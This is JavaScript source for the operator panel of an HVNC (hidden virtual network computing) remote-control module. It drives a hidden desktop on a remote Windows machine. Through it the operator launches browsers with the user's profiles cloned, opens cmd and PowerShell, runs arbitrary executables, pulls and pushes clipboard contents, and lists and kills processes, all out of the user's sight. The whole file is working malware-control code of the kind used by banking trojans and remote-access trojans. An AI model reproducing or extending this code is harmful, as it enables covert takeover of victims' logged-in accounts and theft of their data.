/**
 * HVNC (Hidden Virtual Network Computing) Control Module
 * 
 * Handles all HVNC-related functionality including:
 * - Starting/stopping hidden desktop
 * - Launching applications with profile cloning
 * - Clipboard operations
 * - Process management
 */
(() => {
  "use strict";

  const remdesk = window.remdesk || (window.remdesk = {});
  const { state, dom } = remdesk;

  // HVNC State
  const hvncState = {
    active: false,
    desktopName: null,
    processes: [],
  };

  // DOM Elements for HVNC
  const hvncDom = {
    status: document.getElementById("hvncStatus"),
    startBtn: document.getElementById("hvncStartBtn"),
    stopBtn: document.getElementById("hvncStopBtn"),
    browserDialog: document.getElementById("hvncBrowserDialog"),
    runDialog: document.getElementById("hvncRunDialog"),
    clipboardDialog: document.getElementById("hvncClipboardDialog"),
    processDialog: document.getElementById("hvncProcessDialog"),
    killDialog: document.getElementById("hvncKillDialog"),
    cloneProfileCheckbox: document.getElementById("hvncCloneProfile"),
    exePath: document.getElementById("hvncExePath"),
    exeArgs: document.getElementById("hvncExeArgs"),
    clipboardText: document.getElementById("hvncClipboardText"),
    processPath: document.getElementById("hvncProcessPath"),
    processArgs: document.getElementById("hvncProcessArgs"),
    killPid: document.getElementById("hvncKillPid"),
    hvncButtons: document.querySelectorAll("[data-hvnc-action]"),
    browserButtons: document.querySelectorAll("[data-browser]"),
  };

  /**
   * Update HVNC status display
   */
  function setHvncStatus(message, state) {
    if (!hvncDom.status) return;
    hvncDom.status.textContent = message;
    hvncDom.status.setAttribute("data-state", state || "");
  }

  /**
   * Send HVNC action to client via data channel
   */
  function sendHvncAction(action, payload = {}) {
    if (!state.dataChannel || state.dataChannel.readyState !== "open") {
      setHvncStatus("HVNC: Not connected", "error");
      return false;
    }

    const message = {
      action: `hvnc_${action}`,
      ...payload
    };

    try {
      if (remdesk.sendEncrypted) {
        remdesk.sendEncrypted(message);
      } else {
        state.dataChannel.send(JSON.stringify(message));
      }
      return true;
    } catch (err) {
      console.error("Failed to send HVNC action:", err);
      setHvncStatus("HVNC: Send failed", "error");
      return false;
    }
  }

  /**
   * Start HVNC session - creates hidden desktop
   */
  function startHvnc() {
    setHvncStatus("HVNC: Starting...", "");
    if (sendHvncAction("start")) {
      if (hvncDom.startBtn) hvncDom.startBtn.disabled = true;
    }
  }

  /**
   * Stop HVNC session - closes hidden desktop
   */
  function stopHvnc() {
    setHvncStatus("HVNC: Stopping...", "");
    if (sendHvncAction("stop")) {
      hvncState.active = false;
      updateHvncButtons();
    }
  }

  /**
   * Handle HVNC response from client
   */
  function handleHvncResponse(payload) {
    const action = payload.action || "";
    const success = payload.success !== false;
    const error = payload.error || "";

    switch (action) {
      case "hvnc_start":
        if (success) {
          hvncState.active = true;
          hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
          setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
        } else {
          setHvncStatus(`HVNC: Failed - ${error}`, "error");
        }
        updateHvncButtons();
        break;

      case "hvnc_stop":
        hvncState.active = false;
        hvncState.desktopName = null;
        setHvncStatus("HVNC: Stopped", "");
        updateHvncButtons();
        break;

      case "hvnc_launch_browser":
      case "hvnc_launch_app":
      case "hvnc_launch_cmd":
      case "hvnc_launch_powershell":
      case "hvnc_launch_explorer":
      case "hvnc_run_exe":
      case "hvnc_start_process":
        if (success) {
          setHvncStatus(`HVNC: Launched ${payload.app || payload.path || "process"}`, "active");
          if (payload.pid) {
            hvncState.processes.push({ pid: payload.pid, name: payload.app || payload.path });
          }
        } else {
          setHvncStatus(`HVNC: Launch failed - ${error}`, "error");
        }
        break;

      case "hvnc_get_clipboard":
        if (success && payload.text !== undefined) {
          // Copy to local clipboard
          navigator.clipboard.writeText(payload.text).then(() => {
            setHvncStatus("HVNC: Clipboard copied to local", "active");
          }).catch(() => {
            // Fallback: show in dialog
            prompt("Clipboard content from hidden desktop:", payload.text);
            setHvncStatus("HVNC: Clipboard retrieved", "active");
          });
        } else {
          setHvncStatus(`HVNC: Get clipboard failed - ${error}`, "error");
        }
        break;

      case "hvnc_send_clipboard":
        if (success) {
          setHvncStatus("HVNC: Clipboard sent to hidden desktop", "active");
        } else {
          setHvncStatus(`HVNC: Send clipboard failed - ${error}`, "error");
        }
        closeAllDialogs();
        break;

      case "hvnc_kill_process":
        if (success) {
          setHvncStatus(`HVNC: Process killed`, "active");
        } else {
          setHvncStatus(`HVNC: Kill failed - ${error}`, "error");
        }
        closeAllDialogs();
        break;

      case "hvnc_list_processes":
        if (success && payload.processes) {
          showProcessList(payload.processes);
        } else {
          setHvncStatus(`HVNC: List processes failed - ${error}`, "error");
        }
        break;

      case "hvnc_status":
        hvncState.active = payload.active || false;
        if (hvncState.active) {
          hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
          setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
        } else {
          setHvncStatus("HVNC: Not active", "");
        }
        updateHvncButtons();
        break;

      default:
        if (action.startsWith("hvnc_")) {
          console.log("Unknown HVNC response:", payload);
        }
    }
  }

  /**
   * Update HVNC buttons state
   */
  function updateHvncButtons() {
    if (hvncDom.startBtn) {
      hvncDom.startBtn.disabled = hvncState.active;
    }
    if (hvncDom.stopBtn) {
      hvncDom.stopBtn.disabled = !hvncState.active;
    }
  }

  /**
   * Show dialog
   */
  function showDialog(dialog) {
    if (dialog) {
      dialog.style.display = "flex";
    }
  }

  /**
   * Close dialog
   */
  function closeDialog(dialog) {
    if (dialog) {
      dialog.style.display = "none";
    }
  }

  /**
   * Close all dialogs
   */
  function closeAllDialogs() {
    [hvncDom.browserDialog, hvncDom.runDialog, hvncDom.clipboardDialog, 
     hvncDom.processDialog, hvncDom.killDialog].forEach(d => closeDialog(d));
  }

  /**
   * Handle HVNC action button click
   */
  function handleHvncAction(action) {
    if (!hvncState.active && action !== "start") {
      setHvncStatus("HVNC: Please start HVNC first", "error");
      return;
    }

    switch (action) {
      case "browsers":
        showDialog(hvncDom.browserDialog);
        break;

      case "cmd":
        sendHvncAction("launch_cmd");
        break;

      case "powershell":
        sendHvncAction("launch_powershell");
        break;

      case "explorer":
        sendHvncAction("launch_explorer");
        break;

      case "run":
        showDialog(hvncDom.runDialog);
        break;

      case "get_clipboard":
        sendHvncAction("get_clipboard");
        break;

      case "send_clipboard":
        showDialog(hvncDom.clipboardDialog);
        break;

      case "start_process":
        showDialog(hvncDom.processDialog);
        break;

      case "kill_process":
        showDialog(hvncDom.killDialog);
        break;

      case "list_processes":
        sendHvncAction("list_processes");
        break;
    }
  }

  /**
   * Launch browser with optional profile cloning
   */
  function launchBrowser(browser) {
    const cloneProfile = hvncDom.cloneProfileCheckbox ? hvncDom.cloneProfileCheckbox.checked : true;
    sendHvncAction("launch_browser", {
      browser: browser,
      clone_profile: cloneProfile
    });
    closeDialog(hvncDom.browserDialog);
  }

  /**
   * Run custom executable
   */
  function runExe() {
    const path = hvncDom.exePath ? hvncDom.exePath.value.trim() : "";
    const args = hvncDom.exeArgs ? hvncDom.exeArgs.value.trim() : "";
    
    if (!path) {
      alert("Please enter executable path");
      return;
    }

    sendHvncAction("run_exe", { path, args });
    closeDialog(hvncDom.runDialog);
    
    // Clear inputs
    if (hvncDom.exePath) hvncDom.exePath.value = "";
    if (hvncDom.exeArgs) hvncDom.exeArgs.value = "";
  }

  /**
   * Send clipboard to hidden desktop
   */
  function sendClipboard() {
    const text = hvncDom.clipboardText ? hvncDom.clipboardText.value : "";
    
    if (!text) {
      alert("Please enter text to send");
      return;
    }

    sendHvncAction("send_clipboard", { text });
    closeDialog(hvncDom.clipboardDialog);
    
    if (hvncDom.clipboardText) hvncDom.clipboardText.value = "";
  }

  /**
   * Start process on hidden desktop
   */
  function startProcess() {
    const path = hvncDom.processPath ? hvncDom.processPath.value.trim() : "";
    const args = hvncDom.processArgs ? hvncDom.processArgs.value.trim() : "";
    
    if (!path) {
      alert("Please enter command or path");
      return;
    }

    sendHvncAction("start_process", { path, args });
    closeDialog(hvncDom.processDialog);
    
    if (hvncDom.processPath) hvncDom.processPath.value = "";
    if (hvncDom.processArgs) hvncDom.processArgs.value = "";
  }

  /**
   * Kill process on hidden desktop
   */
  function killProcess() {
    const target = hvncDom.killPid ? hvncDom.killPid.value.trim() : "";
    
    if (!target) {
      alert("Please enter PID or process name");
      return;
    }

    // Check if it's a number (PID) or string (name)
    const pid = parseInt(target, 10);
    if (!isNaN(pid)) {
      sendHvncAction("kill_process", { pid });
    } else {
      sendHvncAction("kill_process", { name: target });
    }
    
    closeDialog(hvncDom.killDialog);
    if (hvncDom.killPid) hvncDom.killPid.value = "";
  }

  /**
   * Show process list
   */
  function showProcessList(processes) {
    const list = processes.map(p => `PID: ${p.pid} - ${p.name}`).join("\n");
    alert("Running processes on hidden desktop:\n\n" + (list || "No processes"));
  }

  /**
   * Initialize HVNC module
   */
  function initHvnc() {
    // Start/Stop buttons
    if (hvncDom.startBtn) {
      hvncDom.startBtn.addEventListener("click", startHvnc);
    }
    if (hvncDom.stopBtn) {
      hvncDom.stopBtn.addEventListener("click", stopHvnc);
    }

    // Action buttons
    hvncDom.hvncButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        const action = btn.dataset.hvncAction;
        if (action) handleHvncAction(action);
      });
    });

    // Browser buttons in dialog
    hvncDom.browserButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        const browser = btn.dataset.browser;
        if (browser) launchBrowser(browser);
      });
    });

    // Dialog close buttons
    document.querySelectorAll(".hvnc-dialog-close").forEach(btn => {
      btn.addEventListener("click", () => {
        const dialog = btn.closest(".hvnc-dialog");
        closeDialog(dialog);
      });
    });

    // Dialog backdrop click to close
    document.querySelectorAll(".hvnc-dialog").forEach(dialog => {
      dialog.addEventListener("click", (e) => {
        if (e.target === dialog) {
          closeDialog(dialog);
        }
      });
    });

    // Run EXE button
    const runExeBtn = document.getElementById("hvncRunExeBtn");
    if (runExeBtn) {
      runExeBtn.addEventListener("click", runExe);
    }

    // Send clipboard button
    const sendClipboardBtn = document.getElementById("hvncSendClipboardBtn");
    if (sendClipboardBtn) {
      sendClipboardBtn.addEventListener("click", sendClipboard);
    }

    // Start process button
    const startProcessBtn = document.getElementById("hvncStartProcessBtn");
    if (startProcessBtn) {
      startProcessBtn.addEventListener("click", startProcess);
    }

    // Kill process button
    const killProcessBtn = document.getElementById("hvncKillProcessBtn");
    if (killProcessBtn) {
      killProcessBtn.addEventListener("click", killProcess);
    }

    // Request HVNC status when connected
    if (state.isConnected) {
      sendHvncAction("status");
    }

    console.log("HVNC module initialized");
  }

  // Export functions
  remdesk.hvnc = {
    state: hvncState,
    start: startHvnc,
    stop: stopHvnc,
    handleResponse: handleHvncResponse,
    sendAction: sendHvncAction,
    init: initHvnc,
  };

  // Auto-init when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initHvnc);
  } else {
    initHvnc();
  }
})();
